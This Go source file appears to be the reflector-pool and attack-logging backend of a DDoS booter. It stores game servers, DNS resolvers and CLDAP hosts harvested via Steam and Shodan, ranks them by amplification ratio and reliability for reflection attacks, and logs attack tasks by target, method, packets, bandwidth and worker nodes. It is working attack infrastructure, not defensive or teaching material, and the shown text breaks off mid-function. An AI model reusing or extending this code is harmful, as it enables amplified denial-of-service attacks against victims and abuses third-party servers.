package reflector

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"strings"
	"sync"
	"time"

	_ "modernc.org/sqlite"
)

type GameConfig struct {
	ID          string
	Name        string
	AppID       int
	SteamFilter string
}

var Games = []GameConfig{
	{ID: "ark", Name: "ARK", AppID: 346110, SteamFilter: `\appid\346110`},
	{ID: "csgo", Name: "CS2 / CS:GO", AppID: 730, SteamFilter: `\appid\730`},
	{ID: "rust", Name: "Rust", AppID: 252490, SteamFilter: `\appid\252490`},
	{ID: "dns", Name: "DNS Resolvers", AppID: 0, SteamFilter: ""},
	{ID: "cldap", Name: "CLDAP Reflectors", AppID: 0, SteamFilter: ""},
	{ID: "other", Name: "Other (Manual Only)", AppID: 0, SteamFilter: ""},
}

type Reflector struct {
	IP           string  `json:"ip"`
	Port         int     `json:"port"`
	ResponseSize int     `json:"response_size"`
	ServerName   string  `json:"server_name"`
	Game         string  `json:"game"`
	Source       string  `json:"source"`
	AddedAt      int64   `json:"added_at"`
	LastTested   int64   `json:"last_tested"`
	LastValid    bool    `json:"last_valid"`
	HasChallenge bool    `json:"has_challenge"`
	SuccessCount int     `json:"success_count"`
	FailCount    int     `json:"fail_count"`
	Score        float64 `json:"score"`
	AmpDomain    string  `json:"amp_domain,omitempty"`
	AmpRatio     float64 `json:"amp_ratio,omitempty"`
	Country      string  `json:"country,omitempty"`
	Continent    string  `json:"continent,omitempty"`
	LatencyMs    int     `json:"latency_ms,omitempty"`
}

type Candidate struct {
	IP        string `json:"ip"`
	Port      int    `json:"port"`
	Game      string `json:"game"`
	Country   string `json:"country"`
	Continent string `json:"continent"`
	Source    string `json:"source"`
	AddedAt   int64  `json:"added_at"`
}

type Pool struct {
	gameID string
	// refreshMu 串行化同一 game 池的整批刷新（定时 cron 与手动"立即刷新"
	// 可能并发执行）：stale 删除用批次时间戳判定，并发刷新会让先完成的
	// 批次被后完成批次误删（last_seen_at < now）。
	refreshMu sync.Mutex
}

type PoolInfo struct {
	Game        string `json:"game"`
	Name        string `json:"name"`
	SteamCount  int    `json:"steam_count"`
	ManualCount int    `json:"manual_count"`
	ShodanCount int    `json:"shodan_count"`
	Total       int    `json:"total"`
}

var (
	db      *sql.DB
	dbOnce  sync.Once
	pools   = make(map[string]*Pool)
	poolsMu sync.RWMutex

	stmtUpsertSteam   *sql.Stmt
	stmtDeleteStale   *sql.Stmt
	stmtDeleteManual  *sql.Stmt
	stmtUpdateSuccess *sql.Stmt
	stmtUpdateFail    *sql.Stmt
	stmtByPoolScore   *sql.Stmt
	stmtCountPool     *sql.Stmt
	stmtCountSrc      *sql.Stmt
	stmtTargetsPool   *sql.Stmt
	stmtAllTargets    *sql.Stmt
)

func getDB() *sql.DB {
	dbOnce.Do(func() {
		os.MkdirAll("data", 0755)
		var err error
		db, err = sql.Open("sqlite", "data/reflectors.db?_pragma=journal_mode(WAL)&_pragma=busy_timeout(5000)&_pragma=synchronous(NORMAL)")
		if err != nil {
			log.Fatalf("[pool] failed to open database: %v", err)
		}
		db.SetMaxOpenConns(4)
		_, err = db.Exec(`
			CREATE TABLE IF NOT EXISTS reflectors (
				id INTEGER PRIMARY KEY AUTOINCREMENT,
				ip TEXT NOT NULL,
				port INTEGER NOT NULL DEFAULT 27015,
				game_pool TEXT NOT NULL,
				response_size INTEGER DEFAULT 0,
				server_name TEXT DEFAULT '',
				game TEXT DEFAULT '',
				source TEXT NOT NULL DEFAULT 'manual',
				has_challenge INTEGER DEFAULT 0,
				success_count INTEGER DEFAULT 0,
				fail_count INTEGER DEFAULT 0,
				last_test_at INTEGER DEFAULT 0,
				last_success_at INTEGER DEFAULT 0,
				last_seen_at INTEGER DEFAULT 0,
				added_at INTEGER NOT NULL,
				score REAL DEFAULT 0.0,
				amp_domain TEXT DEFAULT '',
				amp_ratio REAL DEFAULT 0.0,
				UNIQUE(ip, port)
			);
			CREATE INDEX IF NOT EXISTS idx_reflectors_pool ON reflectors(game_pool);
			CREATE INDEX IF NOT EXISTS idx_reflectors_source ON reflectors(source);
			CREATE INDEX IF NOT EXISTS idx_reflectors_score ON reflectors(game_pool, has_challenge, score DESC);
		`)
		if err != nil {
			log.Fatalf("[pool] failed to initialize schema: %v", err)
		}

		db.Exec("ALTER TABLE reflectors ADD COLUMN amp_domain TEXT DEFAULT ''")
		db.Exec("ALTER TABLE reflectors ADD COLUMN amp_ratio REAL DEFAULT 0.0")
		db.Exec("ALTER TABLE reflectors ADD COLUMN country TEXT DEFAULT ''")
		db.Exec("ALTER TABLE reflectors ADD COLUMN continent TEXT DEFAULT ''")
		db.Exec("ALTER TABLE reflectors ADD COLUMN last_shodan_sync INTEGER DEFAULT 0")
		db.Exec(`
			CREATE TABLE IF NOT EXISTS reflector_candidates (
				ip TEXT NOT NULL,
				port INTEGER NOT NULL,
				game TEXT NOT NULL,
				country TEXT DEFAULT '',
				continent TEXT DEFAULT '',
				source TEXT DEFAULT 'shodan',
				added_at INTEGER DEFAULT 0,
				last_verified INTEGER DEFAULT 0,
				PRIMARY KEY (ip, port, game)
			);
			CREATE INDEX IF NOT EXISTS idx_candidates_game ON reflector_candidates(game);
			CREATE INDEX IF NOT EXISTS idx_candidates_country ON reflector_candidates(country);
		`)
		db.Exec(`
			CREATE TABLE IF NOT EXISTS shodan_sync_log (
				id INTEGER PRIMARY KEY AUTOINCREMENT,
				started_at INTEGER,
				finished_at INTEGER,
				countries TEXT,
				total_fetched INTEGER DEFAULT 0,
				total_added INTEGER DEFAULT 0,
				status TEXT DEFAULT 'running'
			);
		`)
		db.Exec(`
			CREATE TABLE IF NOT EXISTS attack_logs (
				id INTEGER PRIMARY KEY AUTOINCREMENT,
				task_id TEXT NOT NULL,
				target TEXT NOT NULL,
				method TEXT NOT NULL,
				duration INTEGER DEFAULT 0,
				start_time INTEGER NOT NULL,
				end_time INTEGER DEFAULT 0,
				total_packets INTEGER DEFAULT 0,
				total_bytes INTEGER DEFAULT 0,
				peak_pps INTEGER DEFAULT 0,
				peak_bps INTEGER DEFAULT 0,
				total_errors INTEGER DEFAULT 0,
				worker_count INTEGER DEFAULT 0,
				status TEXT NOT NULL DEFAULT 'running',
				workers_json TEXT
			);
			CREATE INDEX IF NOT EXISTS idx_logs_time ON attack_logs(start_time DESC);
			CREATE INDEX IF NOT EXISTS idx_logs_method ON attack_logs(method);
		`)
		// 老库迁移：补 workers_json 列（已存在时 ALTER 报错，忽略即可）
		db.Exec(`ALTER TABLE attack_logs ADD COLUMN workers_json TEXT`)
		initPreparedStmts()
	})
	return db
}

func GetDB() *sql.DB {
	return getDB()
}

func initPreparedStmts() {
	var err error
	stmtUpsertSteam, err = db.Prepare(`
		INSERT INTO reflectors (ip, port, game_pool, response_size, server_name, game, source,
			has_challenge, success_count, fail_count, last_test_at, last_success_at, last_seen_at, added_at, score, amp_domain, amp_ratio, country)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
		ON CONFLICT(ip, port) DO UPDATE SET
			game_pool = excluded.game_pool, response_size = excluded.response_size,
			server_name = excluded.server_name, game = excluded.game,
			source = excluded.source, has_challenge = excluded.has_challenge,
			success_count = MAX(reflectors.success_count, excluded.success_count),
			fail_count = reflectors.fail_count + excluded.fail_count,
			last_test_at = excluded.last_test_at,
			last_success_at = CASE WHEN excluded.success_count > 0 THEN excluded.last_test_at ELSE reflectors.last_success_at END,
			last_seen_at = excluded.last_seen_at,
			amp_domain = excluded.amp_domain,
			amp_ratio = excluded.amp_ratio,
			country = excluded.country,
			score = CASE WHEN excluded.has_challenge = 0 THEN
				(CAST(MAX(reflectors.success_count, excluded.success_count) AS REAL) /
				 CAST(MAX(reflectors.success_count + reflectors.fail_count + excluded.fail_count, 1) AS REAL) * 100.0)
				+ MIN(CAST(strftime('%s','now') - COALESCE(reflectors.added_at, excluded.added_at) AS REAL) / 86400.0, 30.0) * 2.0
				ELSE 0.0 END
	`)
	if err != nil {
		log.Printf("[pool] prepare upsert: %v", err)
	}

	stmtDeleteStale, _ = db.Prepare("DELETE FROM reflectors WHERE game_pool = ? AND source = 'steam' AND last_seen_at < ?")
	stmtDeleteManual, _ = db.Prepare("DELETE FROM reflectors WHERE game_pool = ? AND source IN ('manual', 'shodan') AND last_test_at > 0 AND fail_count >= 3 AND last_success_at < last_test_at")
	// score 直接在同一条 UPDATE 里用 SQL 表达式重算，避免额外的 SELECT + UPDATE
	// 往返（SetMaxOpenConns(1) 下每次往返都串行，合并后从 3 次降为 1 次）。
	// 公式对齐 calculateScore：has_challenge 命中记 0；否则 成功率*100 + min(ageDays,30)*2。
	stmtUpdateSuccess, _ = db.Prepare("UPDATE reflectors SET last_test_at = ?, last_success_at = ?, success_count = success_count + 1, last_seen_at = ?, score = CASE WHEN has_challenge != 0 THEN 0 ELSE ((success_count + 1) * 100.0 / (success_count + 1 + fail_count)) + min((? - added_at) / 86400.0, 30.0) * 2 END WHERE game_pool = ? AND ip = ? AND port = ?")
	stmtUpdateFail, _ = db.Prepare("UPDATE reflectors SET last_test_at = ?, fail_count = fail_count + 1, last_seen_at = ?, score = CASE WHEN has_challenge != 0 THEN 0 ELSE (success_count * 100.0 / (success_count + fail_count + 1)) + min((? - added_at) / 86400.0, 30.0) * 2 END WHERE game_pool = ? AND ip = ? AND port = ?")
	stmtCountPool, _ = db.Prepare("SELECT COUNT(*) FROM reflectors WHERE game_pool = ?")
	stmtCountSrc, _ = db.Prepare("SELECT COUNT(*) FROM reflectors WHERE game_pool = ? AND source = ?")
	stmtTargetsPool, _ = db.Prepare("SELECT ip, port, amp_domain FROM reflectors WHERE game_pool = ? AND has_challenge = 0 ORDER BY score DESC")
	stmtAllTargets, _ = db.Prepare("SELECT ip, port, amp_domain FROM reflectors WHERE has_challenge = 0 AND last_success_at > 0 ORDER BY score DESC")
}

func InitPool(gameID string, _ string) *Pool {
	poolsMu.Lock()
	defer poolsMu.Unlock()

	if existing, ok := pools[gameID]; ok {
		return existing
	}

	getDB()

	p := &Pool{gameID: gameID}
	pools[gameID] = p

	var count int
	if stmtCountPool != nil {
		stmtCountPool.QueryRow(gameID).Scan(&count)
	} else {
		db.QueryRow("SELECT COUNT(*) FROM reflectors WHERE game_pool = ?", gameID).Scan(&count)
	}
	log.Printf("[pool] %s loaded %d reflectors", gameID, count)
	return p
}

func InitAllPools() {
	getDB()
	for _, g := range Games {
		InitPool(g.ID, "")
	}
}

func GetPool(gameID string) *Pool {
	poolsMu.RLock()
	defer poolsMu.RUnlock()
	return pools[gameID]
}

func GetPoolInfo() []PoolInfo {
	var infos []PoolInfo
	for _, g := range Games {
		pool := GetPool(g.ID)
		steam, manual, shodan := 0, 0, 0
		if pool != nil {
			if stmtCountSrc != nil {
				stmtCountSrc.QueryRow(g.ID, "steam").Scan(&steam)
				stmtCountSrc.QueryRow(g.ID, "manual").Scan(&manual)
				stmtCountSrc.QueryRow(g.ID, "shodan").Scan(&shodan)
			}
		}
		infos = append(infos, PoolInfo{
			Game: g.ID, Name: g.Name,
			SteamCount: steam, ManualCount: manual, ShodanCount: shodan,
			Total: steam + manual + shodan,
		})
	}
	return infos
}

// CountryCount 池条目国家分布
type CountryCount struct {
	Country string `json:"country"`
	Count   int    `json:"count"`
}

// PoolHealth 池健康指标
type PoolHealth struct {
	Game        string         `json:"game"`
	Total       int            `json:"total"`
	Steam       int            `json:"steam"`
	Manual      int            `json:"manual"`
	Shodan      int            `json:"shodan"`
	AvgScore    float64        `json:"avg_score"`
	SuccessRate float64        `json:"success_rate"` // 0-100
	AvgLatency  int            `json:"avg_latency_ms"`
	LastTested  int64          `json:"last_tested"` // 最近一次测试时间
	Countries   []CountryCount `json:"countries"`   // Top 10
}

// GetPoolHealth 聚合各池健康指标（成功率/评分/国家分布/最近测试）
func GetPoolHealth() []PoolHealth {
	d := getDB()
	health := make([]PoolHealth, 0, len(Games))
	for _, g := range Games {
		h := PoolHealth{Game: g.ID}
		// 计数
		if stmtCountSrc != nil {
			stmtCountSrc.QueryRow(g.ID, "steam").Scan(&h.Steam)
			stmtCountSrc.QueryRow(g.ID, "manual").Scan(&h.Manual)
			stmtCountSrc.QueryRow(g.ID, "shodan").Scan(&h.Shodan)
		}
		h.Total = h.Steam + h.Manual + h.Shodan
		// 聚合：评分 / 成功率 / 最近测试时间
		var successCount, failCount float64
		d.QueryRow(`
			SELECT COALESCE(AVG(score),0), COALESCE(SUM(success_count),0),
			       COALESCE(SUM(fail_count),0), COALESCE(MAX(last_test_at),0)
			FROM reflectors WHERE game_pool = ?`, g.ID,
		).Scan(&h.AvgScore, &successCount, &failCount, &h.LastTested)
		if successCount+failCount > 0 {
			h.SuccessRate = successCount / (successCount + failCount) * 100
		}
		// 国家分布 Top 10
		rows, err := d.Query(`
			SELECT country, COUNT(*) FROM reflectors
			WHERE game_pool = ? AND country != '' AND country IS NOT NULL
			GROUP BY country ORDER BY COUNT(*) DESC LIMIT 10`, g.ID)
		if err == nil {
			for rows.Next() {
				var cc CountryCount
				if rows.Scan(&cc.Country, &cc.Count) == nil {
					h.Countries = append(h.Countries, cc)
				}
			}
			rows.Close()
		}
		health = append(health, h)
	}
	return health
}

func AllTargets() []string {
	return AllTargetsFiltered("ark", "csgo", "rust", "other")
}

func AllTargetsFiltered(poolIDs ...string) []string {
	d := getDB()
	if len(poolIDs) == 0 {
		return nil
	}
	placeholders := make([]string, len(poolIDs))
	args := make([]interface{}, len(poolIDs))
	for i, pid := range poolIDs {
		placeholders[i] = "?"
		args[i] = pid
	}
	query := fmt.Sprintf("SELECT ip, port, amp_domain FROM reflectors WHERE has_challenge = 0 AND last_success_at > 0 AND game_pool IN (%s) ORDER BY score DESC", strings.Join(placeholders, ","))

	rows, err := d.Query(query, args...)
	if err != nil {
		return nil
	}
	defer rows.Close()

	var targets []string
	seen := make(map[string]bool)
	for rows.Next() {
		var ip string
		var port int
		var ampDomain string
		if err := rows.Scan(&ip, &port, &ampDomain); err != nil {
			continue
		}
		key := fmt.Sprintf("%s:%d|%s", ip, port, ampDomain)
		if !seen[key] {
			seen[key] = true
			targets = append(targets, key)
		}
	}
	return targets
}

func (p *Pool) key(ip string, port int) string {
	return fmt.Sprintf("%s:%d", ip, port)
}

func (p *Pool) Add(r Reflector) bool {
	d := getDB()
	now := time.Now().Unix()
	if r.AddedAt == 0 {
		r.AddedAt = now
	}
	if r.Source == "" {
		r.Source = "manual"
	}

	score := calculateScore(r.SuccessCount, r.FailCount, r.AddedAt, r.HasChallenge)
	danger := 0
	if r.HasChallenge {
		danger = 1
	}

	lastSuccess := int64(0)
	if r.SuccessCount > 0 {
		lastSuccess = now
	}

	result, err := d.Exec(`
		INSERT INTO reflectors (ip, port, game_pool, response_size, server_name, game, source,
			has_challenge, success_count, fail_count, last_test_at, last_success_at, last_seen_at, added_at, score, amp_domain, amp_ratio, country)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
		ON CONFLICT(ip, port) DO UPDATE SET
			game_pool = excluded.game_pool, response_size = excluded.response_size,
			server_name = excluded.server_name, game = excluded.game,
			source = excluded.source, has_challenge = excluded.has_challenge,
			last_test_at = excluded.last_test_at,
			last_success_at = CASE WHEN excluded.last_success_at > 0 THEN excluded.last_success_at ELSE reflectors.last_success_at END,
			last_seen_at = excluded.last_seen_at,
			amp_domain = excluded.amp_domain,
			amp_ratio = excluded.amp_ratio,
			country = excluded.country,
			score = CASE WHEN excluded.has_challenge != 0 THEN 0.0 ELSE
				(CAST(reflectors.success_count AS REAL) /
				 CAST(MAX(reflectors.success_count + reflectors.fail_count, 1) AS REAL) * 100.0)
				+ MIN(CAST(strftime('%s','now') - reflectors.added_at AS REAL) / 86400.0, 30.0) * 2.0
			END
	`, r.IP, r.Port, p.gameID, r.ResponseSize, r.ServerName, r.Game, r.Source,
		danger, r.SuccessCount, r.FailCount, now, lastSuccess, now, r.AddedAt, score, r.AmpDomain, r.AmpRatio, r.Country)
	if err != nil {
		log.Printf("[pool] %s: insert error: %v", p.gameID, err)
		return false
	}
	n, _ := result.RowsAffected()
	return n > 0
}

func (p *Pool) Remove(ip string, port int) bool {
	d := getDB()
	result, err := d.Exec("DELETE FROM reflectors WHERE game_pool = ? AND ip = ? AND port = ?", p.gameID, ip, port)
	if err != nil {
		return false
	}
	n, _ := result.RowsAffected()
	return n > 0
}

func (p *Pool) UpdateTestResult(ip string, port int, valid bool) {
	now := time.Now().Unix()

	if valid {
		if stmtUpdateSuccess != nil {
			// 参数：last_test_at, last_success_at, last_seen_at, score-now, game_pool, ip, port
			if _, err := stmtUpdateSuccess.Exec(now, now, now, now, p.gameID, ip, port); err != nil {
				log.Printf("[pool] %s: update success %s:%d error: %v", p.gameID, ip, port, err)
			}
		}
	} else {
		if stmtUpdateFail != nil {
			// 参数：last_test_at, last_seen_at, score-now, game_pool, ip, port
			if _, err := stmtUpdateFail.Exec(now, now, now, p.gameID, ip, port); err != nil {
				log.Printf("[pool] %s: update fail %s:%d error: %v", p.gameID, ip, port, err)
			}
		}
	}
}

func (p *Pool) UpdateDNSTestResult(ip string, port int, valid bool, ampDomain string, ampRatio float64, responseSize int, serverName string) {
	d := getDB()
	now := time.Now().Unix()

	if valid {
		if stmtUpdateSuccess != nil {
			if _, err := stmtUpdateSuccess.Exec(now, now, now, now, p.gameID, ip, port); err != nil {
				log.Printf("[pool] %s: dns update success %s:%d error: %v", p.gameID, ip, port, err)
			}
		}
		if _, err := d.Exec("UPDATE reflectors SET amp_domain = ?, amp_ratio = ?, response_size = ?, server_name = ? WHERE game_pool = ? AND ip = ? AND port = ?",
			ampDomain, ampRatio, responseSize, serverName, p.gameID, ip, port); err != nil {
			log.Printf("[pool] %s: dns update amp %s:%d error: %v", p.gameID, ip, port, err)
		}
	} else {
		if stmtUpdateFail != nil {
			if _, err := stmtUpdateFail.Exec(now, now, now, p.gameID, ip, port); err != nil {
				log.Printf("[pool] %s: dns update fail %s:%d error: %v", p.gameID, ip, port, err)
			}
		}
	}
}

func calculateScore(successCount, failCount int, addedAt int64, hasChallenge bool) float64 {
	if hasChallenge {
		return 0
	}
	total := successCount + failCount
	if total == 0 {
		total = 1
	}
	successRate := float64(successCount) / float64(total)
	ageDays := float64(time.Now().Unix()-addedAt) / 86400.0
	if ageDays > 30 {
		ageDays = 30
	}
	return successRate*100 + ageDays*2
}

func (p *Pool) RemoveInvalidManual() int {
	var result sql.Result
	var err error
	if stmtDeleteManual != nil {
		result, err = stmtDeleteManual.Exec(p.gameID)
	} else {
		result, err = getDB().Exec("DELETE FROM reflectors WHERE game_pool = ? AND source IN ('manual', 'shodan') AND last_test_at > 0 AND fail_count >= 3 AND last_success_at < last_test_at", p.gameID)
	}
	if err != nil {
		log.Printf("[pool] %s: remove invalid error: %v", p.gameID, err)
		return 0
	}
	n, _ := result.RowsAffected()
	return int(n)
}

func (p *Pool) ReplaceSteamEntries(entries []Reflector) {
	// 空批次保护：若本轮没有任何条目（Steam 查询到服务器但扫描全失败、
	// 或网络抖动），绝不执行 stale 删除——否则会因 last_seen_at < now 把
	// 整个 steam 池清空。宁可保留上一轮的旧数据。
	if len(entries) == 0 {
		log.Printf("[pool] %s: skip steam replace (empty batch, keeping existing entries)", p.gameID)
		return
	}

	// 串行化整批刷新：防止并发批次用各自的时间戳互删对方刚写入的条目
	p.refreshMu.Lock()
	defer p.refreshMu.Unlock()

	now := time.Now().Unix()
	d := getDB()

	tx, err := d.Begin()
	if err != nil {
		log.Printf("[pool] %s: begin tx error: %v", p.gameID, err)
		return
	}
	defer tx.Rollback()

	// 在循环外把 prepared stmt 绑定到本事务一次，避免每条 entry 都 tx.Stmt 重新绑定。
	var txUpsert *sql.Stmt
	if stmtUpsertSteam != nil {
		txUpsert = tx.Stmt(stmtUpsertSteam)
	}

	for _, r := range entries {
		score := calculateScore(r.SuccessCount, r.FailCount, r.AddedAt, r.HasChallenge)
		danger := 0
		if r.HasChallenge {
			danger = 1
		}
		if r.AddedAt == 0 {
			r.AddedAt = now
		}
		if r.Source == "" {
			r.Source = "steam"
		}

		if txUpsert != nil {
			if _, err := txUpsert.Exec(
				r.IP, r.Port, p.gameID, r.ResponseSize, r.ServerName, r.Game, r.Source,
				danger, r.SuccessCount, r.FailCount, now, now, now, r.AddedAt, score, r.AmpDomain, r.AmpRatio, r.Country); err != nil {
				log.Printf("[pool] %s: upsert error for %s:%d: %v", p.gameID, r.IP, r.Port, err)
			}
		}
	}

	if stmtDeleteStale != nil {
		if _, err := tx.Stmt(stmtDeleteStale).Exec(p.gameID, now); err != nil {
			log.Printf("[pool] %s: delete stale error: %v", p.gameID, err)
		}
	} else {
		if _, err := tx.Exec("DELETE FROM reflectors WHERE game_pool = ? AND source = 'steam' AND last_seen_at < ?", p.gameID, now); err != nil {
			log.Printf("[pool] %s: delete stale error: %v", p.gameID, err)
		}
	}

	if err := tx.Commit(); err != nil {
		log.Printf("[pool] %s: commit error: %v", p.gameID, err)
	}
}

func (p *Pool) List() []Reflector {
	return p.queryEntries("SELECT ip, port, response_size, server_name, game, source, has_challenge, success_count, fail_count, last_test_at, last_success_at, added_at, score, amp_domain, amp_ratio, country FROM reflectors WHERE game_pool = ? ORDER BY score DESC", p.gameID)
}

func (p *Pool) Count() int {
	var n int
	if stmtCountPool != nil {
		stmtCountPool.QueryRow(p.gameID).Scan(&n)
	} else {
		getDB().QueryRow("SELECT COUNT(*) FROM reflectors WHERE game_pool = ?", p.gameID).Scan(&n)
	}
	return n
}

func (p *Pool) GetTargets() []string {
	d := getDB()
	var rows *sql.Rows
	var err error
	if stmtTargetsPool != nil {
		rows, err = stmtTargetsPool.Query(p.gameID)
	} else {
		rows, err = d.Query("SELECT ip, port, amp_domain FROM reflectors WHERE game_pool = ? AND has_challenge = 0 ORDER BY score DESC", p.gameID)
	}
	if err != nil {
		return nil
	}
	defer rows.Close()

	var targets []string
	for rows.Next() {
		var ip string
		var port int
		var ampDomain string
		if err := rows.Scan(&ip, &port, &ampDomain); err != nil {
			continue
		}
		targets = append(targets, fmt.Sprintf("%s:%d|%s", ip, port, ampDomain))
	}
	return targets
}

func (p *Pool) GetManualEntries() []Reflector {
	return p.queryEntries("SELECT ip, port, response_size, server_name, game, source, has_challenge, success_count, fail_count, last_test_at, last_success_at, added_at, score, amp_domain, amp_ratio, country FROM reflectors WHERE game_pool = ? AND source IN ('manual', 'shodan') ORDER BY score DESC", p.gameID)
}

func (p *Pool) Flush() error {
	return nil
}

func (p *Pool) queryEntries(query string, args ...interface{}) []Reflector {
	d := getDB()
	rows, err := d.Query(query, args...)
	if err != nil {
		return nil
	}
	defer rows.Close()

	var entries []Reflector
	for rows.Next() {
		var r Reflector
		var hasChallenge int
		var lastSuccess int64
		if err := rows.Scan(&r.IP, &r.Port, &r.ResponseSize, &r.ServerName, &r.Game, &r.Source,
			&hasChallenge, &r.SuccessCount, &r.FailCount, &r.LastTested, &lastSuccess, &r.AddedAt, &r.Score, &r.AmpDomain, &r.AmpRatio, &r.Country); err != nil {
			continue
		}
		r.HasChallenge = hasChallenge != 0
		r.LastValid = lastSuccess > 0

		entries = append(entries, r)
	}
	return entries
}

// LogWorkerStat 攻击日志中的单节点统计（随日志落库，任务从内存清理后仍可查）
type LogWorkerStat struct {
	WorkerID    string `json:"worker_id"`
	PacketsSent uint64 `json:"packets_sent"`
	BytesSent   uint64 `json:"bytes_sent"`
	Errors      uint64 `json:"errors"`
	PeakPPS     uint64 `json:"peak_pps"`
	Finished    bool   `json:"finished"`
}

type AttackLog struct {
	ID           int    `json:"id"`
	TaskID       string `json:"task_id"`
	Target       string `json:"target"`
	Method       string `json:"method"`
	Duration     int    `json:"duration"`
	StartTime    int64  `json:"start_time"`
	EndTime      int64  `json:"end_time"`
	TotalPackets int64  `json:"total_packets"`
	TotalBytes   int64  `json:"total_bytes"`
	PeakPPS      int64  `json:"peak_pps"`
	PeakBPS      int64  `json:"peak_bps"`
	TotalErrors  int64  `json:"total_errors"`
	WorkerCount  int    `json:"worker_count"`
	Status       string `json:"status"`
	// Workers 节点明细（JSON 落库于 workers_json 列）
	Workers []LogWorkerStat `json:"workers,omitempty"`
}

// marshalLogWorkers 把节点明细序列化为 DB 列值（空时返回 NULL）
func marshalLogWorkers(ws []LogWorkerStat) interface{} {
	if len(ws) == 0 {
		return nil
	}
	data, err := json.Marshal(ws)
	if err != nil {
		return nil
	}
	return string(data)
}

// unmarshalLogWorkers 解析 DB 列值到节点明细
func unmarshalLogWorkers(raw interface{}) []LogWorkerStat {
	s, ok := raw.(string)
	if !ok || s == "" {
		return nil
	}
	var ws []LogWorkerStat
	if err := json.Unmarshal([]byte(s), &ws); err != nil {
		return nil
	}
	return ws
}

func LogAttack(log AttackLog) error {
	d := getDB()
	_, err := d.Exec(`
		INSERT INTO attack_logs (task_id, target, method, duration, start_time, end_time,
			total_packets, total_bytes, peak_pps, peak_bps, total_errors, worker_count, status, workers_json)
		VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
	`, log.TaskID, log.Target, log.Method, log.Duration, log.StartTime, log.EndTime,
		log.TotalPackets, log.TotalBytes, log.PeakPPS, log.PeakBPS, log.TotalErrors, log.WorkerCount, log.Status,
		marshalLogWorkers(log.Workers))
	return err
}

func GetLogs(method, status string, page, limit int) ([]AttackLog, int) {
	d := getDB()
	where := "WHERE 1=1"
	args := []interface{}{}
	if method != "" {
		where += " AND method = ?"
		args = append(args, method)
	}
	if status != "" {
		where += " AND status = ?"
		args = append(args, status)
	}

	var total int
	d.QueryRow("SELECT COUNT(*) FROM attack_logs "+where, args...).Scan(&total)

	if limit <= 0 {
		limit = 50
	}
	offset := (page - 1) * limit
	if offset < 0 {
		offset = 0
	}

	rows, err := d.Query(`
		SELECT id, task_id, target, method, duration, start_time, end_time,
			total_packets, total_bytes, peak_pps, peak_bps, total_errors, worker_count, status, workers_json
		FROM attack_logs `+where+` ORDER BY start_time DESC LIMIT ? OFFSET ?
	`, append(args, limit, offset)...)
	if err != nil {
		return nil, 0
	}
	defer rows.Close()

	var logs []AttackLog
	for rows.Next() {
		var l AttackLog
		var workersRaw interface{}
		rows.Scan(&l.ID, &l.TaskID, &l.Target, &l.Method, &l.Duration,
			&l.StartTime, &l.EndTime, &l.TotalPackets, &l.TotalBytes,
			&l.PeakPPS, &l.PeakBPS, &l.TotalErrors, &l.WorkerCount, &l.Status, &workersRaw)
		l.Workers = unmarshalLogWorkers(workersRaw)
		logs = append(logs, l)
	}
	return logs, total
}

func ExportLogsCSV() string {
	d := getDB()
	rows, err := d.Query(`
		SELECT task_id, target, method, duration, start_time, end_time,
			total_packets, total_bytes, peak_pps, peak_bps, total_errors, worker_count, status
		FROM attack_logs ORDER BY start_time DESC LIMIT 10000
	`)
	if err != nil {
		return "task_id,target,method,duration,start_time,end_time,total_packets,total_bytes,peak_pps,peak_bps,total_errors,worker_count,status\n"
	}
	defer rows.Close()

	var sb strings.Builder
	sb.WriteString("task_id,target,method,duration,start_time,end_time,total_packets,total_bytes,peak_pps,peak_bps,total_errors,worker_count,status\n")
	for rows.Next() {
		var l AttackLog
		rows.Scan(&l.TaskID, &l.Target, &l.Method, &l.Duration, &l.StartTime, &l.EndTime,
			&l.TotalPackets, &l.TotalBytes, &l.PeakPPS, &l.PeakBPS, &l.TotalErrors, &l.WorkerCount, &l.Status)
		sb.WriteString(fmt.Sprintf("%s,%s,%s,%d,%d,%d,%d,%d,%d,%d,%d,%d,%s\n",
			l.TaskID, l.Target, l.Method, l.Duration, l.StartTime, l.EndTime,
			l.TotalPackets, l.TotalBytes, l.PeakPPS, l.PeakBPS, l.TotalErrors, l.WorkerCount, l.Status))
	}
	return sb.String()
}

// LogStats 任务历史统计（按时间窗口聚合）
type LogStats struct {
	TotalTasks    int64 `json:"total_tasks"`
	SuccessTasks  int64 `json:"success_tasks"`
	FailedTasks   int64 `json:"failed_tasks"`
	TotalPackets  int64 `json:"total_packets"`
	TotalBytes    int64 `json:"total_bytes"`
	TotalDuration int64 `json:"total_duration"` // 秒
	PeakPPS       int64 `json:"peak_pps"`
	PeakBPS       int64 `json:"peak_bps"`
	ByMethod      []LogStatsBucket `json:"by_method"`
	ByTarget      []LogStatsBucket `json:"by_target"`
	Daily         []LogStatsDay   `json:"daily"`
}

type LogStatsBucket struct {
	Key     string `json:"key"`
	Count   int64  `json:"count"`
	Packets int64  `json:"packets"`
}

type LogStatsDay struct {
	Day     string `json:"day"` // 2006-01-02
	Count   int64  `json:"count"`
	Packets int64  `json:"packets"`
}

// GetLogStats 按最近 days 天聚合攻击日志（统计窗口默认 7 天）。
func GetLogStats(days int) LogStats {
	d := getDB()
	if days <= 0 {
		days = 7
	}
	since := time.Now().Add(-time.Duration(days) * 24 * time.Hour).Unix()

	var s LogStats
	d.QueryRow(`
		SELECT COUNT(*),
			COALESCE(SUM(CASE WHEN status IN ('completed','cancelled') THEN 1 ELSE 0 END), 0),
			COALESCE(SUM(CASE WHEN status = 'failed' THEN 1 ELSE 0 END), 0),
			COALESCE(SUM(total_packets), 0),
			COALESCE(SUM(total_bytes), 0),
			COALESCE(SUM(duration), 0),
			COALESCE(MAX(peak_pps), 0),
			COALESCE(MAX(peak_bps), 0)
		FROM attack_logs WHERE start_time >= ?
	`, since).Scan(&s.TotalTasks, &s.SuccessTasks, &s.FailedTasks,
		&s.TotalPackets, &s.TotalBytes, &s.TotalDuration, &s.PeakPPS, &s.PeakBPS)

	rows, err := d.Query(`
		SELECT method, COUNT(*), COALESCE(SUM(total_packets), 0)
		FROM attack_logs WHERE start_time >= ? GROUP BY method ORDER BY COUNT(*) DESC
	`, since)
	if err == nil {
		defer rows.Close()
		for rows.Next() {
